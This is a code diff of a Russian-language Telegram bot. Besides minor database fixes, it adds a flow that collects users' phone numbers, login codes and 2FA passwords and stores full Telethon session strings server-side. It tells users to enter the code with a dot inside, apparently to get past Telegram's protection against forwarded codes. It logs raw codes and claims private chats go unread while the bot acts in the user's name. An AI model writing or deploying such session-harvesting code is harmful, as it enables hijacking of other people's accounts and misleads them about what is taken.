@@ -259,6 +259,15 @@ def init_db():
                         last_birthday_year INTEGER NOT NULL DEFAULT 0
                     )
                 """)
+                
+                # ===== ФИКС: добавляем колонку chat_name если её нет =====
+                try:
+                    cur.execute("ALTER TABLE user_chats ADD COLUMN IF NOT EXISTS chat_name TEXT")
+                    conn.commit()
+                    logging.info("✅ Колонка chat_name добавлена в user_chats")
+                except Exception as e:
+                    logging.warning(f"Колонка chat_name уже существует или ошибка: {e}")
+                
                 conn.commit()
                 
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
@@ -280,14 +289,19 @@ def init_db():
                     if fname: user_names[uid] = fname
                 cur.execute("SELECT user_id FROM manual_users")
                 for row in cur.fetchall(): manual_added_users.add(int(row[0]))
-                cur.execute("SELECT user_id, chat_id, chat_name FROM user_chats")
-                for row in cur.fetchall():
-                    uid = int(row[0])
-                    cid = int(row[1])
-                    name = row[2]
-                    if uid not in user_dialogs:
-                        user_dialogs[uid] = []
-                    user_dialogs[uid].append((cid, name))
+                
+                # Проверяем существование колонки chat_name перед SELECT
+                try:
+                    cur.execute("SELECT user_id, chat_id, chat_name FROM user_chats")
+                    for row in cur.fetchall():
+                        uid = int(row[0])
+                        cid = int(row[1])
+                        name = row[2] if len(row) > 2 else "Чат"
+                        if uid not in user_dialogs:
+                            user_dialogs[uid] = []
+                        user_dialogs[uid].append((cid, name))
+                except Exception as e:
+                    logging.warning(f"Ошибка чтения user_chats: {e}")
                 
                 logging.info("✅ БД инициализирована")
     except Exception as e:
@@ -321,8 +335,12 @@ def get_user_chats(user_id: int) -> List[Tuple[int, str]]:
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
-                cur.execute("SELECT chat_id, chat_name FROM user_chats WHERE user_id = %s", (user_id,))
-                chats = [(int(row[0]), row[1]) for row in cur.fetchall()]
+                try:
+                    cur.execute("SELECT chat_id, chat_name FROM user_chats WHERE user_id = %s", (user_id,))
+                    chats = [(int(row[0]), row[1]) for row in cur.fetchall()]
+                except:
+                    cur.execute("SELECT chat_id FROM user_chats WHERE user_id = %s", (user_id,))
+                    chats = [(int(row[0]), "Чат") for row in cur.fetchall()]
                 user_dialogs[user_id] = chats
                 return chats
     except Exception as e:
@@ -341,17 +359,18 @@ def delete_user_chat(user_id: int, chat_id: int):
         logging.error(f"Ошибка удаления чата: {e}")
 
 def delete_all_user_chats(user_id: int):
+    count = 0
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
                 cur.execute("DELETE FROM user_chats WHERE user_id = %s", (user_id,))
+                count = cur.rowcount
                 conn.commit()
                 if user_id in user_dialogs:
                     user_dialogs[user_id] = []
-                return 0
     except Exception as e:
         logging.error(f"Ошибка удаления чатов: {e}")
-        return 0
+    return count
 
 def get_business_accounts():
     try:
@@ -1136,7 +1155,216 @@ async def child_birthday_loop():
         except Exception as e:
             logging.error(f"Ошибка birthday-лупа: {e}")
 
-# ==================== ОБРАБОТЧИКИ КНОПОК ====================
+# ==================== АВТОРИЗАЦИЯ ====================
+@dp.callback_query(F.data == "btn_group_auth")
+async def group_auth(callback: CallbackQuery, state: FSMContext):
+    await callback.answer()
+    if get_session(callback.from_user.id):
+        await callback.message.answer("✅ Аккаунт уже подключен!")
+        return
+    
+    keyboard = ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
+        resize_keyboard=True,
+        one_time_keyboard=True
+    )
+    
+    await callback.message.answer(
+        "🔐 <b>Аккаунт используется ТОЛЬКО для авторассылки.</b>\n"
+        "Личная переписка не читается и не сохраняется.\n\n"
+        "📱 <b>Введите номер телефона</b>\n\n"
+        "Отправьте номер в формате:\n"
+        "<code>79123456789</code>\n\n"
+        "Или нажмите кнопку ниже для отправки контакта.",
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+    await state.set_state(AuthState.waiting_for_phone)
+
+@dp.message(StateFilter(AuthState.waiting_for_phone), F.contact | F.text)
+async def process_phone(message: Message, state: FSMContext):
+    await message.answer("⏳ Отправка кода...", reply_markup=ReplyKeyboardRemove())
+    try:
+        if message.contact:
+            phone = message.contact.phone_number
+        elif message.text:
+            phone = re.sub(r'[^\d+]', '', message.text.strip())
+            if phone.startswith('8') and len(phone) == 11:
+                phone = '+7' + phone[1:]
+            elif not phone.startswith('+'):
+                phone = '+' + phone
+        else:
+            await message.answer("❌ Отправь номер телефоном или контактом")
+            return
+        
+        logging.info(f"📱 Номер: {phone}")
+        
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        await client.send_code_request(phone)
+        
+        await state.update_data(
+            phone=phone,
+            client=client
+        )
+        
+        view_code_kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="📩 Посмотреть код", url="https://t.me/telegram")],
+            [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data="btn_group_auth")]
+        ])
+        
+        await message.answer(
+            f"📱 <b>Код подтверждения отправлен!</b>\n\n"
+            f"Номер: <code>{phone}</code>\n\n"
+            f"⚠️ <b>ВАЖНО:</b>\n"
+            f"1️⃣ Нажми «Посмотреть код»\n"
+            f"2️⃣ Открой Telegram и посмотри код\n"
+            f"3️⃣ <b>Введи код с точкой внутри</b>\n"
+            f"<i>Например: 56.785</i>",
+            parse_mode="HTML",
+            reply_markup=view_code_kb
+        )
+        await state.set_state(AuthState.waiting_for_code)
+        
+    except FloodWaitError as e:
+        await message.answer(f"⏳ Подожди {e.seconds} секунд")
+        await state.clear()
+    except Exception as e:
+        logging.error(f"Ошибка: {e}")
+        await message.answer(f"❌ Ошибка: {str(e)}")
+        await state.clear()
+
+@dp.message(StateFilter(AuthState.waiting_for_code), F.text)
+async def process_code(message: Message, state: FSMContext):
+    code_raw = message.text.strip()
+    code = code_raw.replace('.', '')
+    
+    logging.info(f"Код: {code_raw} -> {code}")
+    
+    if not code.isdigit():
+        await message.answer(
+            "❌ <b>Неверный формат!</b>\n\n"
+            "Код должен содержать только цифры и точку.\n"
+            "Например: <code>56.785</code>",
+            parse_mode="HTML"
+        )
+        return
+    
+    data = await state.get_data()
+    phone = data.get("phone")
+    client = data.get("client")
+    
+    if not phone or not client:
+        await message.answer("❌ Данные устарели. Начни заново")
+        await state.clear()
+        return
+    
+    await message.answer("🔄 Проверка кода...")
+    
+    try:
+        await client.sign_in(phone=phone, code=code)
+        
+        final_session = client.session.save()
+        save_session(message.from_user.id, final_session)
+        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+        
+        await start_telethon_listener(message.from_user.id, final_session)
+        
+        await client.disconnect()
+        
+        await message.answer(
+            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
+            f"📊 Бот загрузил все твои чаты.\n"
+            f"Теперь он работает в группах от твоего имени.\n\n"
+            f"{TEXT_COMMANDS_HELP}",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove()
+        )
+        await state.clear()
+        
+    except SessionPasswordNeededError:
+        await message.answer("🔐 <b>Внимание!</b> На аккаунте включена 2FA.\n\nВведи пароль 2FA:", parse_mode="HTML")
+        await state.set_state(AuthState.waiting_for_2fa)
+        
+    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
+        await message.answer(
+            "❌ <b>Неверный код!</b>\n\n"
+            "Проверь код и попробуй еще раз.\n"
+            "⚠️ Не забудь поставить точку внутри кода.\n"
+            "Например: <code>56.785</code>",
+            parse_mode="HTML"
+        )
+        
+    except Exception as e:
+        logging.error(f"Ошибка: {e}")
+        await message.answer(f"❌ Ошибка: {str(e)}")
+        await state.clear()
+
+@dp.message(StateFilter(AuthState.waiting_for_2fa), F.text)
+async def process_2fa(message: Message, state: FSMContext):
+    password = message.text.strip()
+    data = await state.get_data()
+    client = data.get("client")
+    phone = data.get("phone")
+    
+    if not client or not phone:
+        await message.answer("❌ Данные устарели. Начни заново")
+        await state.clear()
+        return
+    
+    try:
+        await client.sign_in(password=password)
+        
+        final_session = client.session.save()
+        save_session(message.from_user.id, final_session)
+        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+        
+        await start_telethon_listener(message.from_user.id, final_session)
+        
+        await client.disconnect()
+        
+        await message.answer(
+            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
+            f"📊 Бот загрузил все твои чаты.\n"
+            f"Теперь он работает в группах от твоего имени.\n\n"
+            f"{TEXT_COMMANDS_HELP}",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove()
+        )
+        await state.clear()
+        
+    except Exception as e:
+        await message.answer(f"❌ Неверный пароль: {str(e)}\nПопробуй еще раз:")
+
+@dp.message(Command("disconnect"))
+async def cmd_disconnect(message: Message):
+    if message.chat.type != "private":
+        await message.answer("❌ Используйте в личных сообщениях.")
+        return
+    user_id = message.from_user.id
+    if not get_session(user_id):
+        await message.answer("❌ У вас нет активной сессии.")
+        return
+    delete_session(user_id)
+    if user_id in telethon_clients:
+        try:
+            await telethon_clients[user_id].disconnect()
+        except:
+            pass
+        del telethon_clients[user_id]
+    delete_all_user_chats(user_id)
+    delete_business_account(user_id)
+    await message.answer(
+        "✅ <b>Аккаунт отключен!</b>\n\n"
+        "🔒 Все данные удалены с сервера:\n"
+        "• Сессия удалена\n"
+        "• Все чаты удалены\n"
+        "• Данные пользователя удалены",
+        parse_mode="HTML",
+        reply_markup=ReplyKeyboardRemove()
+    )
+
+# ==================== ОБРАБОТЧИК КНОПОК ====================
 @dp.callback_query()
 async def process_callbacks(callback: CallbackQuery, state: FSMContext):
     data = callback.data
@@ -1744,187 +1972,6 @@ async def handle(message: Message):
 
     except Exception as e:
         logging.error(f"❌ Ошибка обработки сообщения: {e}")
-
-# ==================== АВТОРИЗАЦИЯ ====================
-@dp.callback_query(F.data == "btn_group_auth")
-async def group_auth(callback: CallbackQuery, state: FSMContext):
-    await callback.answer()
-    if get_session(callback.from_user.id):
-        await callback.message.answer("✅ Аккаунт уже подключен!")
-        return
-    
-    keyboard = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
-        resize_keyboard=True,
-        one_time_keyboard=True
-    )
-    
-    await callback.message.answer(
-        "🔐 <b>Аккаунт используется ТОЛЬКО для авторассылки.</b>\n"
-        "Личная переписка не читается и не сохраняется.\n\n"
-        "📱 <b>Введите номер телефона</b>\n\n"
-        "Отправьте номер в формате:\n"
-        "<code>79123456789</code>\n\n"
-        "Или нажмите кнопку ниже для отправки контакта.",
-        parse_mode="HTML",
-        reply_markup=keyboard
-    )
-    await state.set_state(AuthState.waiting_for_phone)
-
-@dp.message(StateFilter(AuthState.waiting_for_phone), F.contact | F.text)
-async def process_phone(message: Message, state: FSMContext):
-    await message.answer("⏳ Отправка кода...", reply_markup=ReplyKeyboardRemove())
-    try:
-        if message.contact:
-            phone = message.contact.phone_number
-        elif message.text:
-            phone = re.sub(r'[^\d+]', '', message.text.strip())
-            if phone.startswith('8') and len(phone) == 11:
-                phone = '+7' + phone[1:]
-            elif not phone.startswith('+'):
-                phone = '+' + phone
-        else:
-            await message.answer("❌ Отправь номер телефоном или контактом")
-            return
-        
-        logging.info(f"📱 Номер: {phone}")
-        
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
-        await client.send_code_request(phone)
-        
-        await state.update_data(
-            phone=phone,
-            client=client
-        )
-        
-        view_code_kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="📩 Посмотреть код", url="https://t.me/telegram")],
-            [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data="btn_group_auth")]
-        ])
-        
-        await message.answer(
-            f"📱 <b>Код подтверждения отправлен!</b>\n\n"
-            f"Номер: <code>{phone}</code>\n\n"
-            f"⚠️ <b>ВАЖНО:</b>\n"
-            f"1️⃣ Нажми «Посмотреть код»\n"
-            f"2️⃣ Открой Telegram и посмотри код\n"
-            f"3️⃣ <b>Введи код с точкой внутри</b>\n"
-            f"<i>Например: 56.785</i>",
-            parse_mode="HTML",
-            reply_markup=view_code_kb
-        )
-        await state.set_state(AuthState.waiting_for_code)
-        
-    except FloodWaitError as e:
-        await message.answer(f"⏳ Подожди {e.seconds} секунд")
-        await state.clear()
-    except Exception as e:
-        logging.error(f"Ошибка: {e}")
-        await message.answer(f"❌ Ошибка: {str(e)}")
-        await state.clear()
-
-@dp.message(StateFilter(AuthState.waiting_for_code), F.text)
-async def process_code(message: Message, state: FSMContext):
-    code_raw = message.text.strip()
-    code = code_raw.replace('.', '')
-    
-    logging.info(f"Код: {code_raw} -> {code}")
-    
-    if not code.isdigit():
-        await message.answer(
-            "❌ <b>Неверный формат!</b>\n\n"
-            "Код должен содержать только цифры и точку.\n"
-            "Например: <code>56.785</code>",
-            parse_mode="HTML"
-        )
-        return
-    
-    data = await state.get_data()
-    phone = data.get("phone")
-    client = data.get("client")
-    
-    if not phone or not client:
-        await message.answer("❌ Данные устарели. Начни заново")
-        await state.clear()
-        return
-    
-    await message.answer("🔄 Проверка кода...")
-    
-    try:
-        await client.sign_in(phone=phone, code=code)
-        
-        final_session = client.session.save()
-        save_session(message.from_user.id, final_session)
-        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
-        
-        await start_telethon_listener(message.from_user.id, final_session)
-        
-        await client.disconnect()
-        
-        await message.answer(
-            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
-            f"📊 Бот загрузил все твои чаты.\n"
-            f"Теперь он работает в группах от твоего имени.\n\n"
-            f"{TEXT_COMMANDS_HELP}",
-            parse_mode="HTML",
-            reply_markup=ReplyKeyboardRemove()
-        )
-        await state.clear()
-        
-    except SessionPasswordNeededError:
-        await message.answer("🔐 <b>Внимание!</b> На аккаунте включена 2FA.\n\nВведи пароль 2FA:", parse_mode="HTML")
-        await state.set_state(AuthState.waiting_for_2fa)
-        
-    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
-        await message.answer(
-            "❌ <b>Неверный код!</b>\n\n"
-            "Проверь код и попробуй еще раз.\n"
-            "⚠️ Не забудь поставить точку внутри кода.\n"
-            "Например: <code>56.785</code>",
-            parse_mode="HTML"
-        )
-        
-    except Exception as e:
-        logging.error(f"Ошибка: {e}")
-        await message.answer(f"❌ Ошибка: {str(e)}")
-        await state.clear()
-
-@dp.message(StateFilter(AuthState.waiting_for_2fa), F.text)
-async def process_2fa(message: Message, state: FSMContext):
-    password = message.text.strip()
-    data = await state.get_data()
-    client = data.get("client")
-    phone = data.get("phone")
-    
-    if not client or not phone:
-        await message.answer("❌ Данные устарели. Начни заново")
-        await state.clear()
-        return
-    
-    try:
-        await client.sign_in(password=password)
-        
-        final_session = client.session.save()
-        save_session(message.from_user.id, final_session)
-        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
-        
-        await start_telethon_listener(message.from_user.id, final_session)
-        
-        await client.disconnect()
-        
-        await message.answer(
-            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
-            f"📊 Бот загрузил все твои чаты.\n"
-            f"Теперь он работает в группах от твоего имени.\n\n"
-            f"{TEXT_COMMANDS_HELP}",
-            parse_mode="HTML",
-            reply_markup=ReplyKeyboardRemove()
-        )
-        await state.clear()
-        
-    except Exception as e:
-        await message.answer(f"❌ Неверный пароль: {str(e)}\nПопробуй еще раз:")
 
 # ==================== ВЕБ-СЕРВЕР ====================
 async def handle_ping(request):
